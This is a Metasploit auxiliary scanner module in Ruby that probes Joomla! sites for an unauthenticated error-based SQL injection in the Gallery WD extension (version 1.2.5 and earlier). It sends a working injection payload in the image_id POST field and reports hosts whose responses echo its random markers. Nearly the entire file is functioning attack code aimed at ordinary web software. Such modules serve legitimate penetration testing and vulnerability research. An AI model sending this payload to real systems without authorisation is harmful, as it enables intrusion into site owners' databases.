##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Gallery WD for Joomla! Unauthenticated SQL Injection Scanner',
      'Description' => %q{
      This module will scan for Joomla! instances vulnerable to an unauthenticated SQL injection
      within the Gallery WD for Joomla! extension version 1.2.5 and likely prior.
      },
      'Author'       =>
        [
          'CrashBandicoot', #independent discovery/0day drop
          'bperry' #discovery/metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'EDB', '36563']
        ],
      'DisclosureDate' => 'Mar 30 2015'))

    register_options([
      OptString.new('TARGETURI', [true, 'Target URI of the Joomla! instance', '/'])
    ])
  end

  def run_host(ip)
    right_marker = Rex::Text.rand_text_alpha(5)
    left_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    vprint_status("Checking host")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'option' => 'com_gallery_wd',
        'view' => 'gallerybox',
        'image_id' => '-1',
        'gallery_id' => '-1',
        'thumb_width' => '180',
        'thumb_height' => '90',
        'open_with_fullscreen' => 0,
        'image_width' => 800,
        'image_height' => 500,
        'image_effect' => 'fade',
        'sort_by' => 'order',
        'order_by' => 'asc',
        'enable_image_filmstrip' => '',
        'image_filmstrip_height' => 0,
        'enable_image_ctrl_btn' => 1,
        'enable_image_fullscreen' => 1,
        'popup_enable_info' => 1,
        'popup_info_always_show' => 0,
        'popup_hit_counter' => 0,
        'popup_enable_rate' => 0,
        'slideshow_interval' => 5,
        'enable_comment_social' => '',
        'enable_image_facebook' => '',
        'enable_image_twitter' => '',
        'enable_image_google' => '',
        'enable_image_pinterest' => '',
        'enable_image_tumblr' => '',
        'watermark_type' => 'none'
      },
      'vars_post' => {
        'image_id' => "1 AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
        'rate' => '',
        'ajax_task' => 'save_hit_count',
        'task' => 'gallerybox.ajax_search'
      }
    })

    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("Vulnerable to unauthenticated SQL injection within Gallery WD for Joomla!")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Unauthenticated error-based SQL injection in Gallery WD for Joomla!",
        :refs  => self.references.select { |ref| ref.ctx_val == "36563" }
      })
    end

  end
end
